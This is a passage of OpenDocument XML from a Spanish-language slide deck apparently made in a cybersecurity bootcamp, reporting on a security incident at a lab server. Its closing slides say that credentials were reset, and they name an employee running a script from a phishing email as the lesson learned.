          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1498" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1496" text:class-names="">Restablecimos todas las credenciales comprometidas e implementamos mejoras de seguridad.</text:span><text:span text:style-name="a1497" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.14in" svg:y="3.14in" svg:width="0.18in" svg:height="0.18in" draw:id="id453" draw:style-name="a1500" draw:name="Shape 2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4in" svg:y="3.1in" svg:width="4.13in" svg:height="0.38in" draw:id="id454" draw:style-name="a1504" draw:name="Text 24">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1503" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1501" text:class-names="">El servidor opera normalmente con una postura de seguridad significativamente mejorada.</text:span><text:span text:style-name="a1502" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="3.72in" svg:width="9.36in" svg:height="1.3in" draw:id="id455" draw:style-name="a1505" draw:name="Shape 25">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="3.72in" svg:width="9.36in" svg:height="1.3in" draw:id="id456" draw:style-name="a1506" draw:name="Shape 26">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id457" draw:style-name="a1507" draw:name="Image 1" svg:x="0.48in" svg:y="3.82in" svg:width="0.55in" svg:height="0.55in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image9.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.15in" svg:y="3.78in" svg:width="8.4in" svg:height="0.3in" draw:id="id458" draw:style-name="a1511" draw:name="Text 27">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1510" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1508" text:class-names="">La lección más importante:</text:span><text:span text:style-name="a1509" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.15in" svg:y="4.07in" svg:width="8.4in" svg:height="0.85in" draw:id="id459" draw:style-name="a1515" draw:name="Text 28">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1514" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1512" text:class-names="">Este ataque no fue detenido por controles técnicos porque el vector de entrada fue humano. Un empleado ejecutó un script porque el correo parecía legítimo. La capacitación en identificar correos maliciosos es la medida de seguridad más efectiva que puede implementar la organización — más que cualquier herramienta técnica.</text:span><text:span text:style-name="a1513" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <presentation:notes draw:style-name="a1521">
          <draw:page-thumbnail draw:page-number="12" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id460" presentation:style-name="a1516" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id461" presentation:style-name="a1517" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id462" presentation:style-name="a1520" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a1519" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1518" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">12</text:page-number></text:span></text:p>
            </draw:text-box>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="Slide 13" draw:style-name="a1522" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-268">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="0.1in" draw:id="id463" draw:style-name="a1523" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0in" svg:y="5.525in" svg:width="10in" svg:height="0.1in" draw:id="id464" draw:style-name="a1524" draw:name="Shape 1">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.6in" svg:y="0.475in" svg:width="8.8in" svg:height="4.475in" draw:id="id465" draw:style-name="a1525" draw:name="Shape 2">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id466" draw:style-name="a1526" draw:name="Image 0" svg:x="4.25in" svg:y="1.05in" svg:width="1.5in" svg:height="1.5in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image21.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1in" svg:y="2.68in" svg:width="8in" svg:height="0.65in" draw:id="id467" draw:style-name="a1530" draw:name="Text 3">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1529" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1527" text:class-names="">Preguntas y Discusión</text:span><text:span text:style-name="a1528" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1in" svg:y="3.36in" svg:width="8in" svg:height="0.4in" draw:id="id468" draw:style-name="a1534" draw:name="Text 4">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1533" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1531" text:class-names="">El informe técnico completo con evidencia de cada acción está disponible para revisión</text:span><text:span text:style-name="a1532" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0in" svg:y="4.95in" svg:width="10in" svg:height="0.58in" draw:id="id469" draw:style-name="a1535" draw:name="Shape 5">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.3in" svg:y="5.05in" svg:width="9.4in" svg:height="0.38in" draw:id="id470" draw:style-name="a1539" draw:name="Text 6">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1538" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1536" text:class-names="">4Geeks Academy — Bootcamp de Ciberseguridad <text:s text:c="1"/>| <text:s text:c="1"/>Respuesta a Incidente INC-2025-0618-001 <text:s text:c="1"/>| <text:s text:c="1"/>Confidencial</text:span><text:span text:style-name="a1537" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <presentation:notes draw:style-name="a1545">
          <draw:page-thumbnail draw:page-number="13" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id471" presentation:style-name="a1540" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id472" presentation:style-name="a1541" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id473" presentation:style-name="a1544" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a1543" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1542" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">13</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stroke-dash draw:name="a278" draw:display-name="Dash" draw:style="rect" draw:dots1="1" draw:dots1-length="0.0625in" draw:dots2="0" draw:dots2-length="0in" draw:distance="0.0625in"/>
    <draw:stroke-dash draw:name="a316" draw:display-name="Dash" draw:style="rect" draw:dots1="1" draw:dots1-length="0.0625in" draw:dots2="0" draw:dots2-length="0in" draw:distance="0.0625in"/>
    <draw:stroke-dash draw:name="a297" draw:display-name="Dash" draw:style="rect" draw:dots1="1" draw:dots1-length="0.0625in" draw:dots2="0" draw:dots2-length="0in" draw:distance="0.0625in"/>
    <draw:stroke-dash draw:name="a335" draw:display-name="Dash" draw:style="rect" draw:dots1="1" draw:dots1-length="0.0625in" draw:dots2="0" draw:dots2-length="0in" draw:distance="0.0625in"/>
    <draw:stroke-dash draw:name="a221" draw:display-name="Dash" draw:style="rect" draw:dots1="1" draw:dots1-length="0.0625in" draw:dots2="0" draw:dots2-length="0in" draw:distance="0.0625in"/>
    <draw:stroke-dash draw:name="a240" draw:display-name="Dash" draw:style="rect" draw:dots1="1" draw:dots1-length="0.0625in" draw:dots2="0" draw:dots2-length="0in" draw:distance="0.0625in"/>
    <draw:stroke-dash draw:name="a259" draw:display-name="Dash" draw:style="rect" draw:dots1="1" draw:dots1-length="0.0625in" draw:dots2="0" draw:dots2-length="0in" draw:distance="0.0625in"/>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5.625in" fo:page-height="10in" style:print-orientation="portrait" style:register-truth-ref-style-name=""/>
    </style:page-layout>
    <style:page-layout style:name="pageLayout3">
      <style:page-layout-properties fo:page-width="5.625in" fo:page-height="10in" style:print-orientation="portrait" style:register-truth-ref-style-name=""/>
    </style:page-layout>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presentation:notes style:page-layout-name="pageLayout2" draw:style-name="a32">
        <draw:frame draw:id="id0" presentation:style-name="a3" draw:name="Marcador de encabezado 1" svg:x="0in" svg:y="0in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="header" presentation:placeholder="false">
          <draw:text-box>
            <text:p text:style-name="a2" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1" text:class-names=""/></text:p>
          </draw:text-box>
          <svg:title/>
          <svg:desc/>
        </draw:frame>
        <draw:frame draw:id="id1" presentation:style-name="a8" draw:name="Marcador de fecha 2" svg:x="3.18576in" svg:y="0in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="date-time" presentation:placeholder="false">
          <draw:text-box>
            <text:p text:style-name="a7" text:class-names="" text:cond-style-name=""><text:span text:style-name="a4" text:class-names=""><text:date text:fixed="false" style:data-style-name="a5">19/06/2026</text:date></text:span><text:span text:style-name="a6" text:class-names=""/></text:p>
          </draw:text-box>
          <svg:title/>
          <svg:desc/>
        </draw:frame>
        <draw:page-thumbnail svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id2" presentation:style-name="a9" draw:name="Marcador de imagen de diapositiva 3">
          <svg:title/>
          <svg:desc/>
        </draw:page-thumbnail>
        <draw:frame draw:id="id3" presentation:style-name="a24" draw:name="Marcador de notas 4" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="false">
          <draw:text-box>
            <text:p text:style-name="a11" text:class-names="" text:cond-style-name=""><text:span text:style-name="a10" text:class-names="">Haga clic para modificar los estilos de texto del patrón</text:span></text:p>
            <text:list text:style-name="a14">
              <text:list-item>
                <text:list text:style-name="a14">
                  <text:list-item>
                    <text:p text:style-name="a13" text:class-names="" text:cond-style-name=""><text:span text:style-name="a12" text:class-names="">Segundo nivel</text:span></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
            </text:list>
            <text:list text:style-name="a17">
              <text:list-item>
                <text:list text:style-name="a17">
                  <text:list-item>
                    <text:list text:style-name="a17">
                      <text:list-item>
                        <text:p text:style-name="a16" text:class-names="" text:cond-style-name=""><text:span text:style-name="a15" text:class-names="">Tercer ni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Cuarto ni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Quinto nivel</text:span></text:p>
                              </text:list-item>
                            </text:list>
                          </text:list-item>
                        </text:list>
                      </text:list-item>
                    </text:list>
                  </text:list-item>
                </text:list>
              </text:list-item>
            </text:list>
          </draw:text-box>
          <svg:title/>
          <svg:desc/>
        </draw:frame>
        <draw:frame draw:id="id4" presentation:style-name="a27" draw:name="Marcador de pie de página 5" svg:x="0in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="footer" presentation:placeholder="false">
          <draw:text-box>
            <text:p text:style-name="a26" text:class-names="" text:cond-style-name=""><text:span text:style-name="a25" text:class-names=""/></text:p>
          </draw:text-box>
          <svg:title/>
          <svg:desc/>
        </draw:frame>
        <draw:frame draw:id="id5" presentation:style-name="a31" draw:name="Marcador de número de diapositiva 6" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
          <draw:text-box>
            <text:p text:style-name="a30" text:class-names="" text:cond-style-name=""><text:span text:style-name="a28" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">‹Nº›</text:page-number></text:span><text:span text:style-name="a29" text:class-names=""/></text:p>
          </draw:text-box>
          <svg:title/>
          <svg:desc/>
        </draw:frame>
      </presentation:notes>
    </style:master-page>
    <style:master-page style:name="Master1-Layout1-cust-DEFAULT" style:page-layout-name="pageLayout1" draw:style-name="a33">
      <presentation:notes style:page-layout-name="pageLayout2" draw:style-name="a65">
        <draw:frame draw:id="id0" presentation:style-name="a36" draw:name="Marcador de encabezado 1" svg:x="0in" svg:y="0in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="header" presentation:placeholder="false">
          <draw:text-box>
            <text:p text:style-name="a35" text:class-names="" text:cond-style-name=""><text:span text:style-name="a34" text:class-names=""/></text:p>
          </draw:text-box>
          <svg:title/>
          <svg:desc/>
        </draw:frame>
        <draw:frame draw:id="id1" presentation:style-name="a41" draw:name="Marcador de fecha 2" svg:x="3.18576in" svg:y="0in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="date-time" presentation:placeholder="false">
          <draw:text-box>
            <text:p text:style-name="a40" text:class-names="" text:cond-style-name=""><text:span text:style-name="a37" text:class-names=""><text:date text:fixed="false" style:data-style-name="a38">19/06/2026</text:date></text:span><text:span text:style-name="a39" text:class-names=""/></text:p>
          </draw:text-box>
          <svg:title/>
          <svg:desc/>
        </draw:frame>
        <draw:page-thumbnail svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id2" presentation:style-name="a42" draw:name="Marcador de imagen de diapositiva 3">
          <svg:title/>
          <svg:desc/>
        </draw:page-thumbnail>
        <draw:frame draw:id="id3" presentation:style-name="a57" draw:name="Marcador de notas 4" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="false">
          <draw:text-box>
            <text:p text:style-name="a44" text:class-names="" text:cond-style-name=""><text:span text:style-name="a43" text:class-names="">Haga clic para modificar los estilos de texto del patrón</text:span></text:p>
            <text:list text:style-name="a47">
              <text:list-item>
                <text:list text:style-name="a47">
                  <text:list-item>
                    <text:p text:style-name="a46" text:class-names="" text:cond-style-name=""><text:span text:style-name="a45" text:class-names="">Segundo nivel</text:span></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
            </text:list>
            <text:list text:style-name="a50">
              <text:list-item>
                <text:list text:style-name="a50">
                  <text:list-item>
                    <text:list text:style-name="a50">
                      <text:list-item>
                        <text:p text:style-name="a49" text:class-names="" text:cond-style-name=""><text:span text:style-name="a48" text:class-names="">Tercer ni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Cuarto ni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Quinto nivel</text:span></text:p>
                              </text:list-item>
                            </text:list>
                          </text:list-item>
                        </text:list>
                      </text:list-item>
                    </text:list>
                  </text:list-item>
                </text:list>
              </text:list-item>
            </text:list>
          </draw:text-box>
          <svg:title/>
          <svg:desc/>
        </draw:frame>
        <draw:frame draw:id="id4" presentation:style-name="a60" draw:name="Marcador de pie de página 5" svg:x="0in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="footer" presentation:placeholder="false">
          <draw:text-box>
            <text:p text:style-name="a59" text:class-names="" text:cond-style-name=""><text:span text:style-name="a58" text:class-names=""/></text:p>
          </draw:text-box>
          <svg:title/>
          <svg:desc/>
        </draw:frame>
        <draw:frame draw:id="id5" presentation:style-name="a64" draw:name="Marcador de número de diapositiva 6" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
          <draw:text-box>
            <text:p text:style-name="a63" text:class-names="" text:cond-style-name=""><text:span text:style-name="a61" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">‹Nº›</text:page-number></text:span><text:span text:style-name="a6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Informe de Incidente de Seguridad — 4geeks-server-lab</dc:title>
    <dc:subject>PptxGenJS Presentation</dc:subject>
    <meta:initial-creator>PptxGenJS</meta:initial-creator>
    <dc:creator>PptxGenJS</dc:creator>
    <meta:creation-date>2026-06-19T07:02:44Z</meta:creation-date>
    <dc:date>2026-06-19T17:50:02Z</dc:date>
    <meta:editing-cycles>23</meta:editing-cycles>
    <meta:editing-duration>PT0S</meta:editing-duration>
    <meta:document-statistic meta:paragraph-count="0" meta:word-count="0"/>
  </office:meta>
</office:document-meta>
</file>